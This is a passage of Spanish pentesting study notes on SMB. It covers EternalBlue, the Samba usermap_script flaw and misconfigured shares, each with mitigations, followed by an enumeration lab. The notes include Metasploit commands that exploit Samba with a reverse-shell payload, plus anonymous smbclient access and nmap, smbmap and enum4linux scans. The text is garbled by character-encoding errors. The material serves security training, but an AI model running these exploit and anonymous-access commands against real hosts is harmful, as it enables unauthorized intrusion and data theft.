- TambiÃ©n conocido como **CIFS (Common Internet File System)**
- VersiÃ³n actual: **SMBv3**, pero aÃºn existen servicios con SMBv1 (inseguro).

---

## âš ï¸ Vulnerabilidades SMB conocidas

El protocolo **SMB** ha sido histÃ³ricamente un objetivo crÃ­tico en ciberseguridad porque:

ğŸ”¹EstÃ¡ muy extendido en redes corporativas.
ğŸ”¹Corre sobre puertos abiertos (`139` y `445`).
ğŸ”¹Permite compartir archivos, impresoras y recursos sensibles.
ğŸ”¹En versiones antiguas, tiene graves fallos de diseÃ±o y  configuraciÃ³n.

---
### 1ï¸âƒ£ **EternalBlue (MS17-010)**

##### ğŸ”¹**QuÃ© significa:**  
Vulnerabilidad crÃ­tica en **SMBv1**, descubierta en 2017 y explotada por la NSA (herramienta filtrada por Shadow Brokers).

##### ğŸ”¹**CVE:** CVE-2017-0144

	# Identificador de EternalBlue
	# Vulnerabilidad crÃ­tica en SMBv1 de Microsoft
	Windows.
	# Permite ejecuciÃ³n remota de cÃ³digo (RCE) sin
	autenticaciÃ³n.
	# Descubierta en 2017, filtrada de la NSA por el
	grupo Shadow Brokers.
	# Afecta a Windows XP, Vista, 7, 8, 10 y Windows
	Server 2003/2008.
	# Aprovecha un fallo en la forma en que SMBv1
	maneja ciertos paquetes.
	# Un atacante puede enviar paquetes malformados
	al puerto 445/TCP.
	# Esto permite tomar control completo del sistema
	afectado.
	# Exploits famosos: WannaCry, NotPetya
	(propagaciÃ³n como gusano).
	# SoluciÃ³n: aplicar el parche de seguridad MS17
	010 y deshabilitar SMBv1.

##### ğŸ”¹**Impacto:**  
Permite **ejecutar cÃ³digo remoto sin autenticaciÃ³n** (RCE) enviando paquetes malformados al puerto 445.
##### ğŸ”¹**ExplotaciÃ³n famosa:**

	WannaCry (ransomware global en 2017).
    NotPetya (malware destructivo en 2017).
##### ğŸ”¹**Consecuencia:**  
Un atacante puede **tomar el control total de un sistema Windows vulnerable** y propagar el ataque automÃ¡ticamente en toda la red (worm).
##### ğŸ”¹ **MitigaciÃ³n:**

	ğŸ”¹ Deshabilitar SMBv1.
	ğŸ”¹Aplicar el parche de seguridad MS17-010.

---

### 2ï¸âƒ£ **Usermap Script Vulnerability en Samba**

##### ğŸ”¹**QuÃ© significa:**  

Vulnerabilidad en ciertas versiones de **Samba** (implementaciÃ³n de SMB en Linux/Unix).

##### ğŸ”¹**CVE:** CVE-2007-2447

	# Identificador de Usermap Script Vulnerability
	# Vulnerabilidad crÃ­tica en Samba (implementaciÃ³n
	de SMB en sistemas Unix/Linux).
	# Afecta a versiones **anteriores a Samba
	3.0.25rc3**.
	# Samba permitÃ­a que los nombres de usuario se
	asignaran mediante scripts (username map
	script).
	# Un atacante podÃ­a inyectar comandos maliciosos
	en esa asignaciÃ³n, que se ejecutaban directamente
	en el sistema.

Ejemplo del payload en Metasploit:
```bash
use exploit/multi/samba/usermap_script
set RHOST [IP]
set PAYLOAD cmd/unix/reverse
set LHOST [Tu_IP]
exploit
```

##### ğŸ”¹**Impacto:**  

	# Permite ejecuciÃ³n remota de comandos si el
	atacante puede conectarse a un servicio Samba
	vulnerable.

	# No requiere credenciales vÃ¡lidas â†’ se puede
	explotar de forma no autenticada.

	# Consecuencia: ejecuciÃ³n remota de cÃ³digo 
	(RCE) con privilegios del proceso Samba.
	
##### ğŸ”¹**CÃ³mo funciona:**

    - Samba permite usar scripts de "username map"
    para asignar nombres de usuario.
    - Esta funcionalidad era manipulable: un atacante
    podÃ­a inyectar comandos maliciosos que se
    ejecutaban con privilegios elevados.

##### ğŸ”¹**Ejemplo en Metasploit:**

```
use exploit/multi/samba/usermap_script set RHOST [IP] exploit
```

##### ğŸ”¹**Consecuencia:**  

Compromiso completo del sistema Linux con Samba vulnerable.

##### ğŸ”¹ **MitigaciÃ³n:**

- Actualizar Samba a una versiÃ³n parcheada. **3.0.25rc3 o superior**.
- Deshabilitar la caracterÃ­stica de `username map script` si no es necesaria.
- Restringir el acceso a SMB en entornos inseguros.

---
### 3ï¸âƒ£ **Riesgo de shares mal configurados**

##### ğŸ”¹ **QuÃ© significa:**  
    Los shares (recursos compartidos) pueden
    configurarse con diferentes niveles de acceso:
	    - Solo lectura (read-only)
	    - Lectura y escritura (read/write)
	    - Acceso restringido a usuarios especÃ­ficos

##### ğŸ”¹En muchas redes, los administradores **configuran mal estos permisos**, dejando acceso a:
    - Usuarios anÃ³nimos (`guest`, `null session`)
    - Cuentas con contraseÃ±as dÃ©biles o por defecto

##### ğŸ”¹**Impacto:**
    - Lectura no autorizada: un atacante puede
    obtener archivos sensibles, credenciales,
    backups.
    - Escritura no autorizada: un atacante puede 
    subir archivos maliciosos, como shells o malware,
    comprometiendo el sistema.

##### ğŸ”¹**Ejemplo de explotaciÃ³n:**

EnumeraciÃ³n con:
	`smbclient -U "" -L //[IP]`
	`ConexiÃ³n anÃ³nima a un share:
```
smbclient //[IP]/share -U ""
```
    Descarga/subida de archivos sensibles.

##### ğŸ”¹**MitigaciÃ³n:**

- No permitir **login anÃ³nimo**.
- Revisar permisos en cada share.
- Aplicar segmentaciÃ³n de red y monitoreo.

---

## ğŸ” EnumeraciÃ³n de SMB

### 1. Escaneo con Nmap
```bash
nmap -p139,445 --script=*smb* [IP]
nmap -p139,445 -sV [IP]
````

- Detecta versiÃ³n de SMB
- Enumera shares, usuarios, polÃ­ticas de seguridad

ğŸ“Œ Ejemplo de resultado:

```
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
OS: Windows 6.1 (Samba 4.9.5-Debian)
Computer name: DAWN
Domain: dawn
FQDN: dawn.dawn
```

---

### 2. Uso de `smbclient`

Herramienta para interactuar con shares SMB.

#### ğŸ”¹ Ver shares (recursos compartidos en el host):

```bash
smbclient -L IP
```

#### ğŸ”¹  Ver shares (recursos compartidos en el host) y sin contraseÃ±a:

```bash
smbclient -L IP -N
```

#### ğŸ”¹ Conectarse a un share:

```bash
smbclient //[IP]/share -U usuario
```
##### Dentro de la sesiÃ³n SMB (modo interactivo)

Una vez entres, verÃ¡s un prompt como:

`smb: \>`

AhÃ­ puedes usar comandos estilo FTP:

- `ls` â†’ lista archivos.
- `cd <carpeta>` â†’ cambia de directorio.
- `get <archivo>` â†’ descarga un archivo.
- `put <archivo>` â†’ sube un archivo.
- `exit` â†’ salir.
---

### 3. Uso de `smbmap`

EnumeraciÃ³n de shares y permisos de acceso.

```bash
smbmap -H [IP]
```

ğŸ“Œ Ejemplo de salida:

```
Disk    Permissions
print$  NO ACCESS
ITDEPT  READ, WRITE
IPC$    NO ACCESS
```

---

### ğŸ‘‰ 4. Uso de `enum4linux`

Herramienta clÃ¡sica para enumerar usuarios y shares.

```bash
enum4linux -a [IP]
```

- `-a` â†’ Modo completo
- Opcional con credenciales:

```bash
enum4linux -a -u user -p 'password' [IP]
```

---

### 5. Uso de Metasploit

MÃ³dulos Ãºtiles para SMB:

```bash
use auxiliary/scanner/smb/smb_version
use exploit/multi/samba/usermap_script
```

---

## ğŸ“ Ejercicio prÃ¡ctico

### Escenario

Tienes un host en `192.168.210.11` con SMB activo.
### Paso 1: Detectar puertos abiertos

```bash
nmap -p139,445 192.168.210.11
```

### Paso 2: DetecciÃ³n de versiÃ³n y scripts NSE

```bash
nmap -p139,445 -sV --script=smb-os-discovery,smb-enum-shares 192.168.210.11
```

Salida esperada:

- VersiÃ³n de Samba o Windows
- Nombre del equipo
- Nombre del dominio
- Lista de shares disponibles

### Paso 3: Enumerar con smbclient

```bash
smbclient -U "" -L //192.168.210.11
```

Si existen shares con acceso anÃ³nimo, conectarse:

```bash
smbclient //192.168.210.11/ITDEPT -U ""
```

### Paso 4: Enumerar con smbmap

```bash
smbmap -H 192.168.210.11
```

- Ver permisos de lectura/escritura

### Paso 5: EnumeraciÃ³n avanzada con enum4linux

```bash
enum4linux -a 192.168.210.11
```

- Usuarios de dominio
- Shares accesibles
- PolÃ­ticas de seguridad

---
